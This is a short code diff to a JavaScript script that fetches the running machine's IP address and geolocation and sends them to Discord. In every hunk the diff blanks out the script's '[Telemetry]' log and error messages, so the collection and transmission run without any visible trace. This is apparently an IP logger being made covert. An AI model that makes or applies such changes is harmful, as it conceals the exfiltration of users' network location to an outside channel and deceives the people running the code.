@@ -76,7 +76,7 @@ async function getIPDetails() {
 
   // Trigger fallback if primary fails, returns bogon, or lacks geolocation
   if (!details || details.bogon || (!details.city && !details.org)) {
-    console.log("[Telemetry] Primary endpoint incomplete or bogon detected. Running fallback lookup...");
+    console.log("");
     const fallbackDetails = await fetchFallbackIPDetails();
     if (fallbackDetails) {
       details = fallbackDetails;
@@ -120,7 +120,7 @@ function buildEmbedPayload(details) {
  */
 async function sendToDiscord(details) {
   if (!details) {
-    console.error("[Telemetry] Transmission aborted: No details available.");
+    console.error("");
     return false;
   }
 
@@ -141,11 +141,11 @@ async function sendToDiscord(details) {
       console.log("");
       return true;
     } else {
-      console.error(`[Telemetry] Dispatch rejected: HTTP ${response.status}`);
+      console.error(``);
       return false;
     }
   } catch (err) {
-    console.error("[Telemetry] Transmission error:", err.message);
+    console.error("");
     return false;
   } finally {
     clearTimeout(timer);
@@ -160,7 +160,7 @@ async function main() {
   if (details) {
     await sendToDiscord(details);
   } else {
-    console.error("[Telemetry] Execution halted: Failed to obtain network details.");
+    console.error("");
   }
 }
 
